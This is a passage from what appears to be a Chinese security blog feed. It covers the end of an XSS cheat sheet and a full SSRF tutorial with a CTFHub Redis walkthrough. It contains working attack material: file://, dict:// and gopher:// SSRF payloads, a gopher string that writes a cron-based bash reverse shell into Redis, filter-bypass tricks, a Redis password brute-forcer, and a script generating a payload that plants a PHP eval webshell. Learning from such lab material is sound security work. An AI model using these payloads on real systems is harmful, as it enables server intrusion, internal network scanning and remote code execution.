class="hljs-params">(document.cookie)</span></span><br></code></pre></td></tr></table></figure><p>PDF-XSS</p><p>https://github.com/ynsmroztas/pdfsvgxsspayload</p><p>svg-XSS</p><p>https://github.com/ynsmroztas/pdfsvgxsspayload</p><p>EXIF-XSS</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">exiftool -artist=&#x27;&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerrror</span>=<span class="hljs-string">alert(/xss/)</span>&gt;</span>&#x27; test.jpg<br></code></pre></td></tr></table></figure><p>文件上传XSS</p><h2 id="工具">工具</h2><p>XSS平台</p><p>https://xsshs.cn/ https://xss.pt/ http://xsscom.com</p><p>XSStrike</p><p>https://github.com/s0md3v/XSStrike</p><p>xsscrapy</p><p>https://github.com/DanMcInerney/xsscrapy</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/01/01/SSRF/"/>
    <url>/2023/01/01/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="ssrf">SSRF</h1><h2 id="一概念">一、概念</h2><p>SSRF (Server-Side RequestForgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p><h2 id="二ssrf漏洞原理">二、SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式如下所示。</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTPGET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ul><h2 id="三漏洞函数">三、漏洞函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code></p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>payload:<br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=192.168.1.10:3306</span><br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=file:///c:/windows/win.ini</span><br></code></pre></td></tr></table></figure><h2 id="四协议">四、协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test ssrf&lt;br&gt;input param \&quot;url\&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的curl资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);  <span class="hljs-comment">//设置url和相应的选项</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取url并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭curl资源，并且释放系统资源</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file">file://</h3><p>在有回显的情况下，利用 file 协议可以读取任意内容</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/ssrf</span>.php?url=<span class="hljs-symbol">file:</span>/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/windows/win</span>.ini<br></code></pre></td></tr></table></figure><h3 id="dict">dict://</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>一般配合<code>/etc/hosts</code>、<code>proc/net/arp</code>来发现内网网段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ttp:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span>/<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:6379/i</span>nfo  <br></code></pre></td></tr></table></figure><h3 id="gopher">gopher://</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>gopher协议格式：</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code>，可以用来发起GET、POST的http请求。</p><p>特点：</p><ol type="1"><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li><li>Gopher 的以下几点局限性：<ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49可用</li></ul></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A80/_GET%<span class="hljs-number">2520</span>/flag%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br><span class="hljs-comment">#redis写shell</span><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aflushall %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">3</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a1 %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash  -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>adir %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a/var/spool/cron/ %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>adbfilename %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aroot %<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>a*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>asave %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aquit %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><h3 id="http和https">http://和https://</h3><p>探测内网主机存活</p><h2 id="五绕过方式">五、绕过方式</h2><h3 id="绕过"><span class="citation" data-cites="绕过">@绕过</span></h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的。</p><h3 id="点分割符号替换">点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www。target。<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www｡target｡<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www．target．<span class="hljs-keyword">com</span>  <br></code></pre></td></tr></table></figure><h3 id="绕过127.0.0.1等本地ip">绕过127.0.0.1等本地ip</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://127.0.0.1<br>http://localhost<br>http://127.255.255.254<br>127.0.0.1 - 127.255.255.254<br><span class="hljs-link">http://</span>[<span class="hljs-string">::1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:7f00:1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:127.0.0.1</span>]<br>http://127.1<br>http://127.0.1<br>http://0:80  <br></code></pre></td></tr></table></figure><h3 id="ip的进制转换">ip的进制转换</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>进制格式：<span class="hljs-number">0300</span>.<span class="hljs-number">0250</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">16</span>进制格式：<span class="hljs-number">0</span>xC0.<span class="hljs-number">0</span>xA8.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>进制整数格式：<span class="hljs-number">3232235521</span><br><span class="hljs-attribute">16</span>进制整数格式：<span class="hljs-number">0</span>xC0A80001  <br></code></pre></td></tr></table></figure><h3 id="特殊符号">特殊符号</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  <br></code></pre></td></tr></table></figure><h3 id="urlencode">urlencode</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>data = <span class="hljs-string">&quot;www.target.com&quot;</span>;<br>alist = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), <span class="hljs-number">2</span>):<br>alist.append((x[i:i+<span class="hljs-number">2</span>]).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://%&quot;</span>+<span class="hljs-string">&#x27;%&#x27;</span>.join(alist))<br></code></pre></td></tr></table></figure><h3 id="短网址">短网址</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.985.so/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.urlc.cn/  </span><br></code></pre></td></tr></table></figure><h3 id="重定向">重定向</h3><p>在vps上部署</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.10&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="六ssrf漏洞点挖掘">六、SSRF漏洞点挖掘</h2><ol type="1"><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理,属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp;expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpressxmlrpc.php）</li></ol><p>关键字：Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</p><h2 id="七漏洞利用复现">七、漏洞利用复现</h2><h3 id="ssrf打redis">ssrf打redis</h3><p>主要方法：</p><ol type="1"><li>爆破密码</li><li>写shell</li><li>写入ssh公钥</li><li>定时任务反弹shell</li><li>主从复制</li></ol><p>参考https://www.cnblogs.com/wjrblogs/p/14456190.html</p><p>环境：CTFHUB-SSRF-Redis协议</p><p>漏洞点：<code>/?url=</code></p><figure><img src="/img/SSRF_img/clip_image002.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>xxxxxxxxxx npiet.exe -tpic download.png Python</p><figure><img src="/img/SSRF_img/clip_image004.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试用gopher爆破密码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://challenge-f6443f96c8918df3.sandbox.ctfhub.com:10800/?url=&quot;</span>  <span class="hljs-comment">#目标url</span><br>rhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span>   <br>rport = <span class="hljs-string">&quot;6379&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwd.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    passwds = file.readlines()<br>    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:<br>        passwd = passwd.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        len_pass = <span class="hljs-built_in">len</span>(passwd)<br>        payload = <span class="hljs-string">r&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r&quot;%250d%250a&quot;</span>+passwd+<span class="hljs-string">r&quot;%250D%250A%252A1%250D%250A&quot;</span><br>        url = target+<span class="hljs-built_in">str</span>(payload)<br>        text = requests.get(url).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)<br>            <span class="hljs-built_in">print</span>(text + payload)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>无果，写shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># 使用的协议 </span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># 目标redis的端口号 </span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php @eval($_POST[&#x27;xxx&#x27;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shell的名字 </span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span>      <span class="hljs-comment"># 写入的路径</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment"># 如果有密码 则填入</span><br><span class="hljs-comment"># 恶意命令 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += parse.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;二次url编码后的结果:\n&quot;</span> ,parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成gopher写shell的payload</p><figure><img src="/img/SSRF_img/clip_image006.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写马，执行，成功</p><figure><img src="/img/SSRF_img/clip_image008.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>无法写入ssh公钥，原因：redis是www-data权限，写不进/root</p><p>无法写入定时计划反弹shell，原因：没有crontab命令</p><h3 